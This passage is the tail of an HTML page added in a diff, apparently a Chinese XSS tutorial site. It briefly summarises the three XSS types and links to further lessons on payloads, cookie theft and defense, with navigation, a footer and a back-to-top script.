+                            <li><strong>反射型XSS</strong>：最常见，通过恶意链接触发，影响点击链接的用户</li>
+                            <li><strong>存储型XSS</strong>：危害最大，持久化存储，影响所有访问者，可能形成蠕虫</li>
+                            <li><strong>DOM型XSS</strong>：完全在客户端执行，绕过服务器防护，在现代Web应用中越来越常见</li>
+                        </ul>
+                        
+                        <div class="info-box">
+                            <h4><i class="fas fa-graduation-cap"></i> 继续学习</h4>
+                            <p>掌握了XSS的分类后，建议继续学习：</p>
+                            <ul>
+                            <li><a href="xss-payload.html" style="color: var(--neon-green);">XSS Payload编写技巧与混淆绕过</a></li>
+                            <li><a href="cookie-stealing.html" style="color: var(--neon-green);">Cookie窃取与会话劫持实战</a></li>
+                            <li><a href="xss-defense.html" style="color: var(--neon-green);">XSS防御完全指南</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <!-- Article Navigation -->
+                    <div class="article-nav">
+                        <a href="xss-introduction.html">
+                            <i class="fas fa-arrow-left"></i> 上一篇：XSS完全入门
+                        </a>
+                        <a href="xss-payload.html">
+                            下一篇：Payload编写技巧 <i class="fas fa-arrow-right"></i>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container-fluid">
+            <div class="footer-content">
+                <div class="footer-copyright">
+                    <span>© 2025 蓝莲花XSS在线平台</span>
+                    <span class="text-tertiary">|</span>
+                    <span class="text-secondary">v2.0.8</span>
+                </div>
+                <div class="footer-links">
+                    <a href="../index.html"><i class="fas fa-home"></i> 返回首页</a>
+                    <a href="../login.php"><i class="fas fa-sign-in-alt"></i> 登录平台</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+    
+    <!-- 回到顶部按钮 -->
+    <button class="back-to-top" id="backToTop">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+    
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
+    <script>
+        // 回到顶部功能
+        const backToTopBtn = document.getElementById('backToTop');
+        window.addEventListener('scroll', function() {
+            if (window.pageYOffset > 300) {
+                backToTopBtn.classList.add('show');
+            } else {
+                backToTopBtn.classList.remove('show');
+            }
+        });
+        backToTopBtn.addEventListener('click', function() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+    </script>
+</body>
+</html>
